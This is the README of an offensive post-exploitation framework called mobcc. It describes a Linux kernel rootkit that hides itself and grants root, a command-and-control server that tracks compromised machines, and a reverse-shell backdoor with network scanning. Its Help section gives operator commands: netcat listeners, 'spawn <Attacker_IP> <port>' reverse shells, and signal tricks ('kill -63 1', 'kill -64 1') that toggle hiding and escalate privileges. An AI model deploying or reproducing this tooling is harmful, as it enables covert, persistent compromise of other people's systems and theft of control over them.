# mobcc

Mob CC is a post exploitation framework containing a Linux kernel rootkit, C2 server and Reverse shell with network scanning capabilities.

---

## Linux Kernel Rootkit:
  - Use the Makefile to build the module.
  - ftracer.h is a helping module which is basically trying to override the system calls. (Author: xcellerator)
  - Hide and Unhide itself from modules lists.
  - Granting root permissions by updating root credentials.
  - Creating and executing the reverse shell/backdoor which can be used to connect to a C2 server.

## Command & Control server:
  - Add new devices to the database by autocollecting IP from the Https requests.
  - Connect to the target system via reverse shell/backdoor.
  - Send commands and recieve response from the target system via reverse shell.
  - Provide list of all the commands and response from every compromised system.
  - Handle requests from multiple compromised systems simultaneously.

## Reverse shell / Backdoor:
  - When executed, request the C2 server to add this device to the database.
  - Establish the connection between the C2 server and the target system.
  - Spawn a new reverse shell on demand for different IP addresses provided by the C2 server.
  - Scan the network and open ports for potential vulnerabilities in other connected systems.

---

# Note:
  - Note that if you kill the reverse shell process then you have to install the kernel rootkit module again into the target system.
  - No one can remove the module if it's hidden.

---

# Help
  - To spawn a new shell from different device. eg:'nc -lvnp &lt;port&gt;' | 'spawn &lt;Attacker_IP&gt; &lt;port&gt;'
  - To scan the internal network from the target system. 'scan'
  - To kill the connection (reverse shell process) type. 'kill -9 &lt;pid&gt;'
  - To toggle between hide and show the kernel module. 'kill -63 1'
  - To gain root privilege in the target machine from any other attacking machine using reverse shell like above.'kill -64 1'

---


Resources:

Learn how to create Linux Kernel modules: https://xcellerator.github.io/posts/linux_rootkits_01/